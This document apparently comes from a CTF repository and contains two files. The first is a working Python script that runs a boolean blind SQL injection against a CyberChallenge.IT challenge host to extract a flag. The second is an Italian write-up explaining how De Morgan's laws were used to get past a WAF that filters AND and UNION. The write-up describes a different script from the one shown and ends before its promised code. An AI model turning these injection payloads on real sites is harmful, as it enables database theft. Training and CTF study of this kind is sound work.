<file path="web/Filtered/exploit.py">
#!/usr/bin/env python3

import re
import time
import urllib.error
import urllib.parse
import urllib.request


TARGET_URL = "http://filtered.challs.cyberchallenge.it/post.php"
TRUE_MARKER = "I'll not be defeated by hackers!"
FALSE_MARKER = "Article not found!"
FILTER_MARKER = "stripos() expects parameter 1 to be string, array given"
YOUTUBE_MARKER = "youtube.com/embed/KEkrWRHCDQU"
FLAG_RE = re.compile(r"CCIT\{[^{}]+\}")

# Query mirata: prende il testo da flaggy.now row 1 e ne estrae solo la parte che inizia da CCIT{
TARGET_EXPR = (
    "substring(" 
    "(select cast(`now` as char) from `flaggy` limit 1,1),"
    "locate(0x434349547b,(select cast(`now` as char) from `flaggy` limit 1,1)),"
    "64)"
)

# Per evitare di mandare troppe richieste in poco tempo
DELAY = 0.0


def info(message: str) -> None:
    print(f"[*] {message}")


def good(message: str) -> None:
    print(f"[+] {message}")


def warn(message: str) -> None:
    print(f"[-] {message}")


class BlindClient:
    def __init__(self, target: str):
        self.target = target
        self.request_count = 0

    def request(self, payload: str) -> str:
        query = urllib.parse.urlencode({"id": payload})
        url = f"{self.target}?{query}"
        request = urllib.request.Request(url, headers={"User-Agent": "filtered-fast-exploit/1.0"})
        self.request_count += 1
        try:
            with urllib.request.urlopen(request, timeout=10) as response:
                body = response.read().decode("utf-8", "replace")
        except urllib.error.URLError as exc:
            raise RuntimeError(f"request failed for {url}: {exc}") from exc

        if DELAY:
            time.sleep(DELAY)
        return body

    def request_array_probe(self) -> str:
        query = urllib.parse.urlencode([("id[]", "1")])
        url = f"{self.target}?{query}"
        request = urllib.request.Request(url, headers={"User-Agent": "filtered-fast-exploit/1.0"})
        with urllib.request.urlopen(request, timeout=10) as response:
            return response.read().decode("utf-8", "replace")

    def is_true(self, condition: str) -> bool:
        payload = f"0' or ({condition}) or '1'='2"
        body = self.request(payload)
        if FILTER_MARKER in body or YOUTUBE_MARKER in body:
            raise RuntimeError(f"payload finito nel ramo filtered: {payload}")
        if TRUE_MARKER in body:
            return True
        if FALSE_MARKER in body:
            return False
        raise RuntimeError(f"risposta inattesa per payload: {payload}")


def infer_length(client: BlindClient, expression: str, max_length: int = 64) -> int:
    low = 0
    high = max_length
    while low < high:
        mid = (low + high + 1) // 2
        result = client.is_true(f"length(({expression}))>={mid}")
        info(f"len >= {mid} -> {result}")
        if result:
            low = mid
        else:
            high = mid - 1
    return low


def infer_char(client: BlindClient, expression: str, position: int) -> str:
    low = 32
    high = 126
    while low < high:
        mid = (low + high + 1) // 2
        result = client.is_true(f"ascii(substr(({expression}),{position},1))>={mid}")
        info(f"pos {position} >= {mid} -> {result}")
        if result:
            low = mid
        else:
            high = mid - 1
    if client.is_true(f"ascii(substr(({expression}),{position},1))={low}"):
        return chr(low)
    return ""


def extract_flag(client: BlindClient, expression: str) -> str:
    info("Check iniziale: il leak via id[] esiste ancora")
    leak_body = client.request_array_probe()
    if FILTER_MARKER in leak_body:
        good("Confermato: id[] manda stripos in warning e leaka filter.php")
    else:
        warn("Il leak via id[] non e' comparso, continuo comunque con la SQLi")

    info("Check iniziale: la blind SQLi booleana e' stabile")
    if not client.is_true("'1'='1'") or client.is_true("'1'='2'"):
        raise RuntimeError("Primitive booleana non stabile")
    good("Confermato: TRUE/FALSE distinguibili")

    info("Estraggo solo la sottostringa che parte da CCIT{")
    length = infer_length(client, expression)
    good(f"Lunghezza sottostringa target = {length}")

    output = []
    for position in range(1, length + 1):
        character = infer_char(client, expression, position)
        if not character:
            warn(f"Stop su posizione {position}: carattere non estratto")
            break
        output.append(character)
        current = "".join(output)
        good(f"char[{position}] = {character!r} -> {current}")
        match = FLAG_RE.search(current)
        if match:
            return match.group(0)
    return ""


def main() -> int:
    client = BlindClient(TARGET_URL)

    info("Versione rapida: niente enumerazione generale, punto direttamente a flaggy.now[1]")
    flag = extract_flag(client, TARGET_EXPR)

    if not flag:
        warn("Flag non trovata")
        good(f"Richieste totali: {client.request_count}")
        return 1

    good(f"Flag trovata: {flag}")
    good(f"Richieste totali: {client.request_count}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
</file>

<file path="web/Filtered/WRITEUP_gio.md">
# Writeup: Filtered - Bypassing WAF with De Morgan's Laws

## Executive Summary
- **Tipo di Attacco**: Blind SQL Injection (Boolean-based) con bypass di Web Application Firewall (WAF).
- **Vulnerabilità**: Mancanza di sanitizzazione degli input in query SQL, combinata con filtri inefficaci su keyword specifiche.
- **Obiettivo Finale dello Script**: Estrazione completa dei dati dal database attraverso un oracolo booleano, includendo nomi di tabelle, colonne e valori.

## Metodologia e Processo di Scoperta
L'analisi iniziale ha rivelato che l'applicazione web filtrava keyword SQL critiche come **UNION** e **AND**, impedendo iniezioni standard che sfruttano queste parole chiave per concatenare query o condizioni logiche. Tentativi diretti di utilizzare **UNION** per estrarre dati da altre tabelle o **AND** per combinare condizioni in una SQL injection hanno fallito a causa del WAF.

L'indizio matematico fornito, $x \land y = \neg(\neg x \lor \neg y)$, ha rappresentato il punto di svolta. Questo ha suggerito di riformulare le condizioni logiche utilizzando gli operatori negati e l'OR, che non erano filtrati. Il processo mentale ha coinvolto:
- Identificazione delle limitazioni del filtro: solo **UNION** e **AND** erano bloccati, lasciando **OR**, **NOT** e parentesi disponibili.
- Interpretazione dell'indizio come applicazione delle **leggi di De Morgan** per trasformare congiunzioni in disgiunzioni negate.
- Costruzione di un **oracolo booleano**: sfruttando la differenza nelle risposte HTTP (presenza di "One more day ..." vs. altre) per dedurre se una condizione è vera o falsa.
- Iterazione sistematica: partendo dal conteggio delle tabelle, procedendo all'estrazione dei nomi e infine ai valori, utilizzando pattern matching esadecimale per evitare confronti diretti.

Questo approccio ha permesso di bypassare il WAF senza triggerare filtri, trasformando una SQL injection apparentemente bloccata in un attacco efficace.

## Analisi Logico-Matematica (L'Exploit Core)
Le **leggi di De Morgan** forniscono l'equivalenza logica necessaria per sostituire l'operatore **AND** filtrato:

$$
x \land y = \neg(\neg x \lor \neg y)
$$

Nel contesto SQL, dove $x$ e $y$ rappresentano condizioni booleane, questa trasformazione permette di esprimere congiunzioni utilizzando solo **OR** e **NOT**. Ad esempio, una condizione come `id=3 AND 1=1` diventa `NOT(NOT(id=3) OR NOT(1=1))`.

Questa equivalenza è cruciale perché:
- Mantiene la semantica logica originale.
- Utilizza operatori non filtrati dal WAF.
- Permette la costruzione di query condizionali complesse senza keyword proibite.

L'oracolo booleano si basa su questa trasformazione: se la condizione interna è vera, la query restituisce risultati che influenzano la risposta HTTP, segnalando un match positivo.

## Strategia di Sfruttamento (Exploitation)
L'attacco è strutturato in fasi iterative, ciascuna sfruttando l'oracolo booleano per estrarre informazioni bit per bit:

1. **Conteggio Tabelle**: Utilizzo di una query che conta le tabelle nel database corrente (`information_schema.tables`). Il payload incrementa un contatore fino a trovare il numero esatto dove la condizione è vera.

2. **Estrazione Nomi Tabelle**: Per ciascuna tabella, estrazione del nome in formato esadecimale (`hex(table_name)`) utilizzando pattern matching con **LIKE**. Il dizionario '0123456789abcdef' viene iterato per costruire il nome carattere per carattere, fermandosi quando non ci sono più match.

3. **Selezione Tabella Target**: L'utente sceglie la tabella di interesse (tipicamente quella contenente la flag).

4. **Conteggio Colonne**: Analogamente al conteggio tabelle, ma per le colonne della tabella selezionata (`information_schema.columns`).

5. **Estrazione Nomi Colonne**: Estrazione dei nomi delle colonne in esadecimale, utilizzando lo stesso meccanismo di pattern matching.

6. **Estrazione Valori**: Per ciascuna colonna, estrazione dei valori dalla tabella target, sempre in esadecimale e carattere per carattere.

Trucchi sintattici chiave:
- **Bilanciamento degli Apici**: Il payload termina con `OR '0` per chiudere correttamente la stringa SQL e prevenire errori di sintassi.
- **Limitazione Subquery**: Uso di `LIMIT {offset}, 1` per evitare errori "Subquery returns more than 1 row".
- **Codifica Esadecimale**: Conversione in HEX per gestire caratteri speciali e facilitare il pattern matching senza confronti diretti.

## Analisi dello Script/Payload
Lo script Python automatizza l'intero processo utilizzando la libreria **requests** per inviare query HTTP GET. Le sezioni chiave includono:

- **Cicli While True**: Utilizzati per incrementare contatori (tabelle, colonne) o costruire stringhe (nomi, valori) fino a trovare il match esatto. Questo approccio brute-force è efficiente per database di dimensioni ragionevoli.
- **Dizionario Esadecimale**: Il set '0123456789abcdef' limita le iterazioni a 16 caratteri per posizione, ottimizzando le performance.
- **Gestione Risposte**: Controllo dello status code (200-299) e presenza di "One more day ..." come indicatore di condizione vera.
- **Decodifica HEX**: Conversione finale da esadecimale a stringa UTF-8 per ottenere i nomi e valori leggibili.
- **Ottimizzazioni**: L'uso di `LIMIT` previene errori di subquery multi-riga, mentre il pattern matching **LIKE** evita confronti esatti che potrebbero essere filtrati.

Lo script è modulare, permettendo la selezione interattiva della tabella target e gestendo errori di decodifica.

## Codice dell'Exploit Commentato
Di seguito è riportato il codice completo dell'exploit, commentato riga per riga per facilitare la comprensione del flusso logico e delle tecniche utilizzate.

